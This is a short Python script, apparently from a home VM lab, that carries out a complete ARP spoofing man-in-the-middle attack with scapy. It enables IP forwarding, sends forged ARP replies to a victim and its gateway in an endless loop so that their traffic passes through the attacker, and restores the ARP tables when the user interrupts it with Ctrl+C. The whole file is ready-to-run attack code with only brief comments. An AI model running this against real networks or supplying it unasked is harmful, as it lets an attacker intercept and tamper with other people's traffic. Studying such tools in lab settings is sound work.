#!/usr/bin/env python

import scapy.all as scapy
import subprocess
import time

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip) # make arp
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") # make broadcast ethernet frame
    arp_request_broadcast = broadcast/arp_request # arp encapsulated by ethernet frame
    # arp_request_broadcast.show()
    answered_list, unanswered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False) # send arp and get arp response

    return answered_list[0][1].hwsrc # first element and only response part, and get mac

def spoof(target_ip, spoof_ip):
    # 'op=2' means arp response, specify the target info(pdst, hwdst) and modify the router info(psrc)
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    # print(packet.show(), packet.summary)
    scapy.send(packet, verbose=False)

def restore(target_ip, original_ip):
    target_mac = get_mac(target_ip)
    original_mac = get_mac(original_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=original_ip, hwsrc=original_mac)
    # print(packet.show(), packet.summary)
    scapy.send(packet, verbose=False, count=4)

## just example data in vm LAB
victim = "192.168.158.142"
gateway = "192.168.158.2"
##

subprocess.call('echo 1 > /proc/sys/net/ipv4/ip_forward', shell=True) # activate ip portfowarding in Kali
sent_packets_count = 0
try :
    while True:
        spoof(victim, gateway) # spoof target
        spoof(gateway, victim) # spoof router(gateway)
        sent_packets_count+=2
        print("\r[+] Packets sent : " + str(sent_packets_count), end='') # dynamic printing
        time.sleep(2) # 2 seconds delay
except KeyboardInterrupt:
    print("\n[+] Detected Ctrl+C quitting, Resetting ARP table...", end='')
    restore(victim, gateway)
    restore(gateway, victim)
    subprocess.call('echo 0 > /proc/sys/net/ipv4/ip_forward', shell=True)
    print("Done.")




